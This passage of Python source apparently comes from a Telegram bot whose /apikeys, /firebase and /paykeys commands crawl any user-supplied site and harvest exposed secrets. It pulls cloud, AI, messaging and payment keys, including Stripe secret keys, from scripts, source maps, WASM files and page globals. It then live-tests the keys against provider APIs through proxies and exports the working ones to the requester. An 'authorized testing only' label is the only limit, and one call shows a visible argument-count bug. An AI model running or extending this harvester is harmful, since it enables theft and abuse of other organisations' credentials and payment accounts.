        "dom_result":  results[0].get("dom_result"),
        "page_url":    results[0].get("page_url",""),
        "pages_crawled": len(results),
    }
    seen_urls = set()
    for r in results:
        for entry in r.get("network_log",[]):
            u = entry.get("url","")
            if u not in seen_urls:
                seen_urls.add(u)
                merged["network_log"].append(entry)
        merged["console_log"].extend(r.get("console_log",[]))
        # Accumulate HTML for pattern scanning
        extra_html = r.get("html","")
        if extra_html and extra_html != merged["html"]:
            merged["html"] += f"\n<!-- PAGE: {r.get('page_url','')} -->\n" + extra_html[:30000]
    return merged


def _extract_run(url: str, js_code: str, progress_cb=None) -> dict:
    """Try Playwright first, fallback to static."""
    if progress_cb: progress_cb("🌐 Launching browser...")
    data = _run_playwright_extract(url, js_code, progress_cb)
    if data.get("error") == "playwright_not_installed":
        if progress_cb:
            progress_cb(
                "⚠️ *Playwright not installed* — static fallback mode\n"
                "⚠️ Dynamic tokens (localStorage, sessionStorage, IDB, ShadowDOM) မရနိုင် — HTML + linked JS only"
            )
        data = _static_extract(url)
    return data


# ══════════════════════════════════════════════════
# 🔑  1. /apikeys — API Key Extractor
# ══════════════════════════════════════════════════

_API_KEY_PATTERNS = [
    # Google
    ("Google Maps / Places / YouTube",  re.compile(r'\b(AIza[0-9A-Za-z_\-]{35})\b')),
    # OpenAI
    ("OpenAI",                           re.compile(r'\b(sk-[A-Za-z0-9]{20,60})\b')),
    ("OpenAI Project key",               re.compile(r'\b(sk-proj-[A-Za-z0-9\-_]{40,120})\b')),
    # AWS
    ("AWS Access Key ID",                re.compile(r'\b(AKIA[0-9A-Z]{16})\b')),
    ("AWS Secret Access Key",            re.compile(r'(?i)aws.{0,30}secret.{0,10}[=:\s]["\']?([A-Za-z0-9/+=]{40})\b')),
    # Twilio
    ("Twilio Account SID",               re.compile(r'\b(AC[a-f0-9]{32})\b')),
    ("Twilio Auth Token",                re.compile(r'(?i)twilio.{0,30}auth.{0,10}[=:\s]["\']?([a-f0-9]{32})\b')),
    # SendGrid
    ("SendGrid",                         re.compile(r'\b(SG\.[A-Za-z0-9_\-]{22,60}\.[A-Za-z0-9_\-]{22,60})\b')),
    # Mapbox
    ("Mapbox Token",                     re.compile(r'\b(pk\.eyJ1[A-Za-z0-9_\-\.]+)\b')),
    # GitHub
    ("GitHub Token",                     re.compile(r'\b(gh[pousr]_[A-Za-z0-9]{36,255})\b')),
    # Slack
    ("Slack Bot Token",                  re.compile(r'\b(xox[baprs]-[A-Za-z0-9\-]{20,200})\b')),
    ("Slack Webhook",                    re.compile(r'(https://hooks\.slack\.com/services/T[A-Za-z0-9]+/B[A-Za-z0-9]+/[A-Za-z0-9]+)')),
    # Mailchimp
    ("Mailchimp API Key",                re.compile(r'\b([0-9a-f]{32}-us[0-9]{1,2})\b')),
    # HubSpot
    ("HubSpot API Key",                  re.compile(r'(?i)hubspot.{0,30}[=:\s]["\']?([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})\b')),
    # Square
    ("Square Access Token",              re.compile(r'\b(sq0atp-[A-Za-z0-9_\-]{22,43})\b')),
    # Shopify
    ("Shopify Storefront Token",         re.compile(r'(?i)shopify.{0,30}token.{0,10}[=:\s]["\']?([a-f0-9]{32})\b')),
    # Generic secret/api key patterns
    ("Generic API Key",                  re.compile(r'(?i)(?:api[_\-]?key|apikey|api[_\-]?token|access[_\-]?key|secret[_\-]?key)\s*[=:]\s*["\']([A-Za-z0-9_\-]{20,80})["\']')),
]

# Phase 2: process.env / import.meta.env static replacement scan
# Bundlers (webpack/vite) inline these at build time — scan for residue patterns
_ENV_INJECT_PATTERNS = [
    # webpack DefinePlugin inlines: "process.env.X" → ""value""
    ("process.env key",   re.compile(r'process\.env\.([A-Z_]{3,60})\s*(?:,|\)|\s)')),
    # vite inlines import.meta.env.X → actual value in bundle
    ("import.meta.env",   re.compile(r'import\.meta\.env\.([A-Z_]{3,60})')),
    # Residual quoted values after inlining: "AKIA..." "sk-..." adjacent to env ref
    ("Inlined env value", re.compile(
        r'(?:process\.env\.[A-Z_]+|import\.meta\.env\.[A-Z_]+)'
        r'\s*[,|&?:)]\s*["\']([A-Za-z0-9_\-+=/]{16,120})["\']'
    )),
    # __webpack_require__ env object: {REACT_APP_KEY:"value"}
    ("Webpack env obj",   re.compile(
        r'"(?:REACT_APP|NEXT_PUBLIC|VITE_|VUE_APP)_([A-Z_]+)"\s*:\s*"([A-Za-z0-9_\-+=/]{10,120})"'
    )),
]


def _scan_env_injections(network_log: list) -> list:
    """
    Phase 2: Scan JS bundle bodies for inlined process.env / import.meta.env values.
    Returns list of {type, name, value, source} dicts.
    """
    findings = []
    seen = set()
    for entry in network_log:
        body = entry.get("response_body", "")
        if not body or len(body) < 50:
            continue
        src_label = f"JS: {entry['url'][:80]}"
        for pat_name, pat in _ENV_INJECT_PATTERNS:
            for m in pat.finditer(body):
                if m.lastindex and m.lastindex >= 2:
                    # Webpack env obj: group1=key_suffix, group2=value
                    name  = m.group(1)
                    value = m.group(2)
                elif m.lastindex == 1:
                    val = m.group(1).strip()
                    # process.env ref — just the key name, not a value
                    if pat_name in ("process.env key", "import.meta.env"):
                        dedup = "env_key:" + val
                        if dedup not in seen:
                            seen.add(dedup)
                            findings.append({"type": "Env var reference", "name": val,
                                             "value": f"[referenced, value not inlined]",
                                             "source": src_label})
                        continue
                    name  = pat_name
                    value = val
                else:
                    continue
                dedup = "env:" + name + ":" + value[:60]
                if dedup in seen or len(value) < 8:
                    continue
                seen.add(dedup)
                # Also check if value looks like a real key
                is_key = any(p.search(value) for _, p in _API_KEY_PATTERNS)
                findings.append({
                    "type":    pat_name + (" [KEY MATCH]" if is_key else ""),
                    "name":    name,
                    "value":   value[:200],
                    "source":  src_label,
                })
    return findings


_APIKEY_JS_EVAL = """() => {
    const results = {};
    const kwds = ['apiKey','api_key','apikey','accessKey','secretKey','authToken',
                  'OPENAI_API_KEY','GOOGLE_API_KEY','MAPBOX_TOKEN','AWS_ACCESS'];
    kwds.forEach(k => {
        try {
            const v = window[k] || (window.__ENV__ && window.__ENV__[k])
                     || (window._env_ && window._env_[k])
                     || (window.ENV && window.ENV[k]);
            if (v && typeof v === 'string' && v.length > 10) results[k] = v;
        } catch(e) {}
    });
    // Also scan meta tags
    document.querySelectorAll('meta[name*="key"],meta[name*="token"]').forEach(m=>{
        if (m.content && m.content.length > 10) results['meta:'+m.name] = m.content;
    });
    return results;
}"""


def _validate_api_key(key_type: str, key_value: str, timeout: int = 6) -> dict:
    """
    Phase 3: Live-probe one API key.
    Returns {"status": "valid"|"invalid"|"unknown"|"skipped", "note": str}
    """
    validator = _KEY_VALIDATORS.get(key_type)
    if validator is None:
        return {"status": "skipped", "note": "No probe configured"}

    url      = validator["url"].replace("{key}", key_value)
    method   = validator.get("method", "GET")
    hdrs     = {k: v.replace("{key}", key_value)
                for k, v in validator.get("headers", {}).items()}
    hdrs.update(_get_headers())

    try:
        if method == "GET":
            r = requests.get(url, headers=hdrs, timeout=timeout, verify=False,
                             proxies=proxy_manager.get_proxy())
        else:
            r = requests.post(url, headers=hdrs, timeout=timeout, verify=False,
                              proxies=proxy_manager.get_proxy())

        if validator["valid_if"](r):
            return {"status": "valid", "note": f"HTTP {r.status_code} — key accepted"}
        if validator["invalid_if"](r):
            return {"status": "invalid", "note": f"HTTP {r.status_code} — key rejected"}
        return {"status": "unknown", "note": f"HTTP {r.status_code} — inconclusive"}
    except Exception as e:
        return {"status": "error", "note": str(e)[:80]}


def _validate_findings(findings: list, progress_cb=None) -> list:
    """
    Run live validation on all findings that have a known validator.
    Mutates each finding dict in-place, adds 'validation' key.
    Returns list of validated findings (valid ones first).
    """
    PROBEABLE = set(_KEY_VALIDATORS.keys()) - {k for k,v in _KEY_VALIDATORS.items() if v is None}
    validated = 0
    for f in findings:
        ktype = f.get("type","")
        val   = f.get("value","")
        if not val or len(val) < 10:
            continue
        # Match key_type prefix
        matched = next((k for k in PROBEABLE if k in ktype), None)
        if not matched:
            continue
        if progress_cb and validated == 0:
            progress_cb("🔬 Live-validating discovered API keys...")
        result = _validate_api_key(matched, val)
        f["validation"] = result
        validated += 1
        if progress_cb:
            emoji = {"valid":"✅","invalid":"❌","unknown":"❓","skipped":"⏭️","error":"⚠️"}.get(result["status"],"❓")
            progress_cb(f"  {emoji} `{ktype[:30]}` → {result['note']}")

    # Sort: valid → unknown → invalid → skipped/error
    _vsort = {"valid":0,"unknown":1,"invalid":2,"skipped":3,"error":4}
    findings.sort(key=lambda f: _vsort.get(f.get("validation",{}).get("status","skipped"), 3))
    return findings


def _scan_wasm_secrets(base_url: str, network_log: list) -> list:
    """
    Phase 3 Fix 4: WASM binary secret scan.
    - Finds .wasm URLs from network_log + HTML
    - Fetches binary, extracts printable ASCII strings >= 8 chars
    - Runs _API_KEY_PATTERNS + _CSRF_PATTERNS on extracted strings
    """
    import struct
    findings = []
    seen_wasm = set()
    wasm_pat  = re.compile(r'([A-Za-z0-9/_\-.:?=&%]+\.wasm[A-Za-z0-9?=&%_]*)')

    # Collect .wasm URLs from network log + seed page HTML
    wasm_urls = set()
    for entry in network_log:
        url_e = entry.get("url","")
        if ".wasm" in url_e:
            wasm_urls.add(url_e)
        for m in wasm_pat.finditer(entry.get("response_body","")[:80000]):
            raw = m.group(1)
            if not raw.startswith("http"):
                from urllib.parse import urlparse as _up_w, urljoin as _uj_w
                _base = _up_w(base_url)
                raw = _uj_w(f"{_base.scheme}://{_base.netloc}", raw)
            wasm_urls.add(raw)

    if not wasm_urls:
        return findings

    def _extract_strings(data: bytes, min_len: int = 8) -> list:
        """Extract printable ASCII strings from binary blob."""
        strings = []
        current = []
        for byte in data:
            c = chr(byte)
            if c.isprintable() and c not in ("\x00",):
                current.append(c)
            else:
                if len(current) >= min_len:
                    strings.append("".join(current))
                current = []
        if len(current) >= min_len:
            strings.append("".join(current))
        return strings

    for wasm_url in list(wasm_urls)[:10]:  # cap at 10 .wasm files
        if wasm_url in seen_wasm:
            continue
        seen_wasm.add(wasm_url)
        try:
            r = requests.get(wasm_url, timeout=10, verify=False,
                             headers=_get_headers(), proxies=proxy_manager.get_proxy(),
                             stream=True)
            if r.status_code != 200:
                continue
            # Cap at 5MB
            raw = b""
            for chunk in r.iter_content(65536):
                raw += chunk
                if len(raw) > 5_242_880:
                    break
            r.close()
            # Validate WASM magic
            if raw[:4] != b"\x00asm":
                continue
            strings = _extract_strings(raw)
            text_blob = "\n".join(strings)
            src_label = f"WASM: {wasm_url[:80]}"
            for key_type, pat in _API_KEY_PATTERNS:
                for m in pat.finditer(text_blob):
                    val = (m.group(1) if m.lastindex else m.group(0)).strip()
                    dedup = "wasm:" + key_type + ":" + val[:60]
                    if dedup not in seen_wasm and len(val) >= 10:
                        seen_wasm.add(dedup)
                        findings.append({"type": key_type + " (WASM)",
                                          "value": val[:200], "source": src_label})
            for key_type, pat in _CSRF_PATTERNS:
                for m in pat.finditer(text_blob):
                    val = (m.group(1) if m.lastindex else m.group(0)).strip()
                    dedup = "wasm_csrf:" + val[:60]
                    if dedup not in seen_wasm and len(val) >= 8:
                        seen_wasm.add(dedup)
                        findings.append({"type": key_type + " (WASM)",
                                          "name": key_type, "value": val[:200], "source": src_label})
        except Exception:
            pass
    return findings


def _fetch_sourcemap_keys(network_log: list) -> list:
    """
    Fix 5 (Phase 1): Source map fetch & parse.
    Each JS bundle တွင် '//# sourceMappingURL=x.js.map' ပါလျှင် fetch ပြီး
    sourcesContent ထဲ API key patterns run လုပ်သည်။
    """
    findings = []
    seen_sm = set()
    sm_url_pat = re.compile(r'//# sourceMappingURL=([^\s]+\.map)')

    for entry in network_log:
        body = entry.get("response_body", "")
        if not body:
            continue
        js_url = entry.get("url", "")
        # Extract sourceMappingURL from body tail (last 300 chars)
        tail = body[-300:]
        m = sm_url_pat.search(tail)
        if not m:
            continue
        map_ref = m.group(1)
        # Build absolute URL
        if map_ref.startswith("http"):
            map_url = map_ref
        elif map_ref.startswith("//"):
            from urllib.parse import urlparse as _up_sm
            _parsed_js = _up_sm(js_url)
            map_url = f"{_parsed_js.scheme}:{map_ref}"
        else:
            map_url = js_url.rsplit("/", 1)[0] + "/" + map_ref

        if map_url in seen_sm:
            continue
        seen_sm.add(map_url)
        try:
            r = requests.get(map_url, timeout=8, verify=False,
                             headers=_get_headers(), proxies=proxy_manager.get_proxy())
            if r.status_code != 200 or len(r.text) < 50:
                continue
            sm_json = r.json()
            sources_content = sm_json.get("sourcesContent") or []
            sources_names   = sm_json.get("sources") or []
            for idx, src_text in enumerate(sources_content):
                if not src_text or len(src_text) < 20:
                    continue
                src_name = sources_names[idx] if idx < len(sources_names) else f"src[{idx}]"
                for key_type, pat in _API_KEY_PATTERNS:
                    for km in pat.finditer(src_text):
                        val = (km.group(1) if km.lastindex else km.group(0)).strip()
                        dedup = key_type + ":" + val[:60]
                        if dedup not in seen_sm and len(val) >= 10:
                            seen_sm.add(dedup)
                            findings.append({
                                "type":   key_type,
                                "value":  val,
                                "source": f"SourceMap: {src_name[:80]}",
                            })
        except Exception:
            pass
    return findings


def _apikeys_sync(url: str, progress_cb=None) -> dict:
    data = _extract_run(url, _APIKEY_JS_EVAL, progress_cb)
    if data.get("error"):
        return {"error": data["error"], "findings": [], "page_url": url}

    # ── Option A: Dynamic intercept + Option B: Deep asset fetch ─────
    if progress_cb: progress_cb("🌐 Dynamic intercept + deep asset fetch...")
    dyn        = _playwright_dynamic_scan(url, "apikeys", progress_cb)
    new_assets = _deep_asset_fetch(url, data.get("network_log", []), progress_cb)
    data       = _merge_dynamic_into_data(data, dyn, new_assets)

    # ── Merge hook data (window globals scan) ─────────────────────────
    for k, v in (dyn.get("hooks", {}).get("apikeys_globals") or {}).items():
        if v:
            for key_type, pat in _API_KEY_PATTERNS:
                m = pat.search(v)
                if m:
                    val = (m.group(1) if m.lastindex else m.group(0)).strip()
                    data.setdefault("dom_result", {})["dyn_" + k] = val

    findings = []
    seen = set()

    def _add(key_type, value, source):
        dedup = key_type + ":" + value[:60]
        if dedup in seen or len(value) < 10:
            return
        seen.add(dedup)
        findings.append({"type": key_type, "value": value, "source": source})

    if progress_cb: progress_cb("🔍 Scanning all sources for API keys...")

    for text, label in _gather_all_text(data):
        for key_type, pat in _API_KEY_PATTERNS:
            for m in pat.finditer(text):
                val = m.group(1) if m.lastindex else m.group(0)
                _add(key_type, val.strip(), label)

    # DOM result
    for k, v in (data.get("dom_result") or {}).items():
        for key_type, pat in _API_KEY_PATTERNS:
            m = pat.search(str(v))
            if m:
                _add(key_type, (m.group(1) if m.lastindex else m.group(0)), f"window.{k}")
        if len(str(v)) > 15:
            _add("window global", str(v)[:80], f"window.{k}")

    # Source map scan (Phase 1 Fix 5)
    if progress_cb:
        progress_cb("🗺️ Checking source maps (.js.map)...")
    sm_findings = _fetch_sourcemap_keys(data.get("network_log", []))
    for sf in sm_findings:
        _add(sf["type"], sf["value"], sf["source"])

    # Env injection scan (Phase 2 Fix 3)
    if progress_cb:
        progress_cb("🔬 Scanning process.env / import.meta.env injections...")
    env_findings = _scan_env_injections(data.get("network_log", []))
    for ef in env_findings:
        _add(ef["type"], ef.get("name", ef["type"]), ef["value"], ef["source"])

    # Phase 3 Fix 4: WASM binary secret scan
    if progress_cb:
        progress_cb("🕵️ Scanning WASM binaries for secrets...")
    wasm_findings = _scan_wasm_secrets(url, data.get("network_log", []))
    for wf in wasm_findings:
        _add(wf["type"], wf.get("value","")[:60], wf["source"])

    # Phase 3: Live validation of discovered keys
    if progress_cb:
        progress_cb("🔬 Running live key validation...")
    findings = _validate_findings(findings, progress_cb)

    valid_count = len([f for f in findings if f.get("validation",{}).get("status") == "valid"])
    return {"error": None, "findings": findings, "page_url": data["page_url"],
            "requests": len(data.get("network_log", [])),
            "sourcemap_scanned": len(sm_findings) > 0,
            "env_refs":    len([e for e in env_findings if "KEY MATCH" in e.get("type","")]),
            "valid_keys":  valid_count}


async def cmd_apikeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/apikeys <url> — Extract Google, OpenAI, AWS, Twilio, Mapbox & more API keys"""
    if not await check_force_join(update, context): return
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/apikeys https://example.com`\n\n"
            "🔑 *Detects:*\n"
            "  • Google Maps / Places / YouTube (`AIza...`)\n"
            "  • OpenAI (`sk-...`)\n"
            "  • AWS Access Key ID (`AKIA...`)\n"
            "  • Twilio, SendGrid, Mapbox, Slack\n"
            "  • GitHub tokens, Mailchimp, HubSpot\n"
            "  • Generic api\\_key / secret patterns\n\n"
            "⚠️ _Authorized testing only_", parse_mode='Markdown')
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    url = context.args[0].strip()
    if not url.startswith("http"): url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return
    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"🔑 *API Key Extractor — `{domain}`*\n\n⏳ Scanning...", parse_mode='Markdown')
    progress_q = []
    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                t = progress_q[-1]; progress_q.clear()
                try: await msg.edit_text(f"🔑 *API Keys — `{domain}`*\n\n{t}", parse_mode='Markdown')
                except: pass
    prog = asyncio.create_task(_prog())
    try:
        result = await asyncio.to_thread(_apikeys_sync, url, lambda t: progress_q.append(t))
        progress_q.append("\U0001f534 Phase 2: real-time network stream intercept...")
        live_result = await asyncio.to_thread(
            _stream_intercept_sync, url, lambda t: progress_q.append(t)
        )
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"\u274c `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()
    if result.get("error"):
        await msg.edit_text(f"\u274c `{result['error']}`", parse_mode='Markdown')
        return
    raw_findings = result["findings"]
    findings = _confidence_crossref(raw_findings, live_result)
    page_url = result["page_url"]
    reqs = result.get("requests", 0)
    live_reqs = len(live_result.get("live_requests", []))
    confirmed   = [f for f in findings if "CONFIRMED" in f.get("confidence","")]
    high_live   = [f for f in findings if f.get("confidence","").startswith("HIGH")]
    static_only = [f for f in findings if "STATIC" in f.get("confidence","")]
    if not findings:
        await msg.edit_text(
            f"\U0001f511 *API Key Extractor \u2014 `{domain}`*\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n"
            f"\U0001f4ed No API keys found\n\U0001f310 `{page_url}`\n"
            f"\U0001f4e1 Static: `{reqs}` | Live: `{live_reqs}`",
            parse_mode='Markdown')
        return
    lines = [
        f"\U0001f511 *API Keys \u2014 `{domain}`*", "\u2501"*20,
        f"\U0001f310 `{page_url}`",
        f"\U0001f4e1 Static: `{reqs}` | Live: `{live_reqs}` requests",
        f"\u2705 CONFIRMED: `{len(confirmed)}` | \U0001f534 Live-only: `{len(high_live)}` | \u26a0\ufe0f Static-only: `{len(static_only)}`\n",
    ]
    ordered = (
        [(f, "\u2705 CONFIRMED") for f in confirmed] +
        [(f, "\U0001f534 LIVE")  for f in high_live] +
        [(f, "\u26a0\ufe0f STATIC") for f in static_only]
    )
    for i, (f, badge) in enumerate(ordered[:25], 1):
        lines.append(f"*[{i}]* {badge} `{f['type']}`")
        lines.append(f"  `{f['value'][:80]}`")
        lines.append(f"  _\U0001f4c2 {f.get('source','')[:60]}_\n")
    lines.append("\u2501"*18 + "\n\u26a0\ufe0f _Authorized testing only_")
    report = "\n".join(lines)
    try:
        await msg.edit_text(report[:4000], parse_mode='Markdown')
    except BadRequest:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')
    import io as _io
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d = re.sub(r'[^\w\-]', '_', domain)
    export = {
        "domain": domain, "page_url": page_url,
        "scanned_at": datetime.now().isoformat(),
        "findings": findings,
        "live_requests_captured": live_reqs,
        "sse_frames_captured": len(live_result.get("sse_frames", [])),
    }
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=_io.BytesIO(json.dumps(export, indent=2, ensure_ascii=False).encode()),
            filename=f"apikeys_{safe_d}_{ts}.json",
            caption=(
                f"\U0001f511 API Keys \u2014 `{domain}`\n"
                f"\u2705 Confirmed: `{len(confirmed)}` | \u26a0\ufe0f Static-only: `{len(static_only)}`"
            ),
            parse_mode='Markdown')
    except Exception as e:
        logger.warning("apikeys export error: %s", e)


# ══════════════════════════════════════════════════
# 🔥  2. /firebase — Firebase Config Extractor
# ══════════════════════════════════════════════════

_FIREBASE_JS_EVAL = """() => {
    const results = {};
    // Check window.firebaseConfig or similar globals
    ['firebaseConfig','firebase_config','FIREBASE_CONFIG','__firebase_config',
     '_firebaseConfig','firebaseOptions'].forEach(k => {
        try { if (window[k] && typeof window[k]==='object') results[k] = window[k]; } catch(e){}
    });
    // Check Firebase app instances
    try {
        if (window.firebase && window.firebase.apps && window.firebase.apps.length) {
            results['firebase_app'] = window.firebase.apps[0].options;
        }
    } catch(e) {}
    // Check __NEXT_DATA__ / __nuxt / window.__env
    ['__NEXT_DATA__','__nuxt','__ENV__','_env_','ENV','REACT_APP_ENV'].forEach(k=>{
        try {
            const v = window[k];
            if (v && typeof v === 'object') {
                const s = JSON.stringify(v);
                if (s.includes('firebaseConfig') || s.includes('apiKey') && s.includes('projectId')) {
                    results['env:'+k] = v;
                }
            }
        } catch(e) {}
    });
    return results;
}"""

_FIREBASE_PATTERNS = re.compile(
    r'(?:firebaseConfig|initializeApp)\s*[=({]\s*\{([^}]{50,2000})\}', re.I | re.S)
_FIREBASE_FIELD = re.compile(
    r'(?:apiKey|authDomain|projectId|storageBucket|messagingSenderId|appId|measurementId|databaseURL)'
    r'\s*:\s*["\']([^"\']{4,200})["\']', re.I)

def _firebase_sync(url: str, progress_cb=None) -> dict:
    data = _extract_run(url, _FIREBASE_JS_EVAL, progress_cb)
    if data.get("error"):
        return {"error": data["error"], "findings": [], "page_url": url}

    # ── Option A + B ──────────────────────────────────────────────────
    if progress_cb: progress_cb("🌐 Dynamic Firebase intercept + deep asset fetch...")
    dyn        = _playwright_dynamic_scan(url, "firebase", progress_cb)
    new_assets = _deep_asset_fetch(url, data.get("network_log", []), progress_cb)
    data       = _merge_dynamic_into_data(data, dyn, new_assets)

    # Merge Firebase hook: initializeApp captures
    fb_hook = dyn.get("hooks", {}).get("firebase", {})
    for key, cfg in fb_hook.items():
        if isinstance(cfg, dict):
            cfg_str = json.dumps(cfg)
            dr = data.get("dom_result") or {}
            dr[f"dyn_firebase_{key}"] = cfg_str
            data["dom_result"] = dr

    configs = []
    seen = set()

    def _parse_config_block(block: str, source: str):
        fields = {}
        for m in _FIREBASE_FIELD.finditer(block):
            fields[m.group(0).split(":")[0].strip().strip('"\'').strip()] = m.group(1)
        if fields.get("projectId") or fields.get("apiKey"):
            key = fields.get("projectId", "") + fields.get("apiKey", "")
            if key not in seen:
                seen.add(key)
                configs.append({"source": source, "config": fields})

    if progress_cb: progress_cb("🔍 Scanning for Firebase config...")

    for text, label in _gather_all_text(data):
        for m in _FIREBASE_PATTERNS.finditer(text):
            _parse_config_block(m.group(0), label)
        # Also scan line by line for firebaseConfig object
        if "projectId" in text and "apiKey" in text:
            _parse_config_block(text, label)

    # DOM result
    dr = data.get("dom_result") or {}
    for k, v in dr.items():
        if isinstance(v, dict) and ("projectId" in v or "apiKey" in v):
            key = str(v.get("projectId","")) + str(v.get("apiKey",""))
            if key not in seen:
                seen.add(key)
                configs.append({"source": f"window.{k}", "config": {str(fk): str(fv) for fk,fv in v.items() if isinstance(fv, str)}})
        elif isinstance(v, (dict, list)):
            _parse_config_block(json.dumps(v), f"window.{k}")

    return {"error": None, "findings": configs, "page_url": data["page_url"],
            "requests": len(data.get("network_log", []))}


async def cmd_firebase(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/firebase <url> — Extract Firebase project config (apiKey, projectId, appId, etc.)"""
    if not await check_force_join(update, context): return
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/firebase https://example.com`\n\n"
            "🔥 *Extracts full Firebase config:*\n"
            "  • `apiKey` — Firebase API key\n"
            "  • `authDomain` — Auth domain\n"
            "  • `projectId` — Project identifier\n"
            "  • `storageBucket` — Storage bucket\n"
            "  • `messagingSenderId` — FCM sender\n"
            "  • `appId` — App identifier\n"
            "  • `measurementId` — Analytics\n\n"
            "⚠️ _Authorized testing only_", parse_mode='Markdown')
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    url = context.args[0].strip()
    if not url.startswith("http"): url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return
    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"🔥 *Firebase Extractor — `{domain}`*\n\n⏳ Scanning...", parse_mode='Markdown')
    progress_q = []
    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                t = progress_q[-1]; progress_q.clear()
                try: await msg.edit_text(f"🔥 *Firebase — `{domain}`*\n\n{t}", parse_mode='Markdown')
                except: pass
    prog = asyncio.create_task(_prog())
    try:
        result = await asyncio.to_thread(_firebase_sync, url, lambda t: progress_q.append(t))
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()
    if result.get("error"):
        await msg.edit_text(f"❌ `{result['error']}`", parse_mode='Markdown')
        return
    findings = result["findings"]
    page_url = result["page_url"]
    if not findings:
        await msg.edit_text(
            f"🔥 *Firebase Extractor — `{domain}`*\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📭 No Firebase config found\n🌐 `{page_url}`",
            parse_mode='Markdown')
        return
    lines = [f"🔥 *Firebase Config — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
             f"🌐 `{page_url}`", f"✅ Found: `{len(findings)}` config(s)\n"]
    for i, f in enumerate(findings, 1):
        lines.append(f"*[{i}] Firebase Config*")
        lines.append(f"  _📂 {f['source'][:60]}_")
        for k, v in f["config"].items():
            lines.append(f"  `{k}`: `{v}`")
        lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━\n⚠️ _Authorized testing only_")
    report = "\n".join(lines)
    try:
        if len(report) <= 4000: await msg.edit_text(report, parse_mode='Markdown')
        else: await msg.edit_text(report[:4000], parse_mode='Markdown')
    except BadRequest:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')
    import io as _io
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d = re.sub(r'[^\w\-]', '_', domain)
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=_io.BytesIO(json.dumps({"domain": domain, "page_url": page_url,
                "scanned_at": datetime.now().isoformat(), "findings": findings},
                indent=2, ensure_ascii=False).encode()),
            filename=f"firebase_{safe_d}_{ts}.json",
            caption=f"🔥 Firebase Config — `{domain}`",
            parse_mode='Markdown')
    except Exception as e:
        logger.warning("firebase export error: %s", e)


# ══════════════════════════════════════════════════
# 💳  3. /paykeys — Payment Key Extractor
# ══════════════════════════════════════════════════

_PAY_PATTERNS = [
    # ── Stripe ────────────────────────────────────────────────────────────────
    ("Stripe Publishable Key",      re.compile(r'\b(pk_(?:live|test)_[A-Za-z0-9]{20,60})\b')),
    ("Stripe Secret Key",           re.compile(r'\b(sk_(?:live|test)_[A-Za-z0-9]{20,60})\b')),
    ("Stripe Webhook Secret",       re.compile(r'\b(whsec_[A-Za-z0-9]{20,60})\b')),
    ("Stripe Restricted Key",       re.compile(r'\b(rk_(?:live|test)_[A-Za-z0-9]{20,60})\b')),
    # ── PayPal — require "paypal" keyword (removed generic "client" matching) ─
    ("PayPal Client ID",            re.compile(r'(?i)paypal[_-]?(?:client[_-]?)?id\s*[=:]\s*["\']?(A[A-Za-z0-9_-]{47,97})["\']?')),
    # ── Braintree — require specific suffix ───────────────────────────────────
    ("Braintree Tokenization",      re.compile(r'(?i)braintree[_-]?(?:client|token|auth)\s*[=:]\s*["\']?([A-Za-z0-9]{20,100})["\']?')),
    # ── Square — prefix already specific enough ───────────────────────────────
    ("Square App ID",               re.compile(r'\b(sq0idp-[A-Za-z0-9_-]{22,43})\b')),
    ("Square Access Token",         re.compile(r'\b(sq0atp-[A-Za-z0-9_-]{22,43})\b')),
    # ── Razorpay ──────────────────────────────────────────────────────────────
    ("Razorpay Key ID",             re.compile(r'\b(rzp_(?:live|test)_[A-Za-z0-9]{14,20})\b')),
    # ── Adyen — tighter context ───────────────────────────────────────────────
    ("Adyen Client Key",            re.compile(r'(?i)adyen[_-]?client[_-]?key\s*[=:]\s*["\']?([A-Za-z0-9_-]{20,80})["\']?')),
    # ── Authorize.net ─────────────────────────────────────────────────────────
    ("Authorize.net API Login",     re.compile(r'(?i)authorize[_-]?net[_-]?(?:api[_-]?)?login\s*[=:]\s*["\']([A-Za-z0-9]{6,20})["\']')),
    # ── WooCommerce ───────────────────────────────────────────────────────────
    ("WooCommerce Consumer Key",    re.compile(r'\b(ck_[a-f0-9]{40})\b')),
    ("WooCommerce Consumer Secret", re.compile(r'\b(cs_[a-f0-9]{40})\b')),
    # ── Paddle — require "paddle" keyword ────────────────────────────────────
    ("Paddle Vendor ID",            re.compile(r'(?i)paddle[_-]?vendor[_-]?id\s*[=:]\s*["\']?(\d{4,10})["\']?')),
